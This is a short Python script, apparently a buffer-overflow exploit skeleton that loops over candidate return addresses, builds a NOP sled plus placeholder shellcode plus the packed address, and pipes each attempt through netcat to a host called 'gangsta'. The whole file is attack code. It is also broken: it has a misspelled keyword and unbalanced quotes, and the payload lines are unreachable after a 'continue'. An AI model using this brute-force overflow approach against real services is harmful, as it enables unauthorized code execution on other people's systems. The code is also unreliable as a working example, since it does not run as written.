import os
import struct

shellcode = "I put my shell code here"

memory = 4294955008
for i in range (3000):
  mem_ad = hex(memory)
  hex_int = int(mem_ad, 16)
  pack = struct.pack('<L', hex_int)
  if "\x00" iin pack:
    memory += 1
    continue
    pad = "\x90" * 445
    command_prompt = "echo " + '"' + "000" + pad + shellcode + pack + '"'
    os.system(command_prompt + " | " + nc gangsta 0000")
    memory += 1
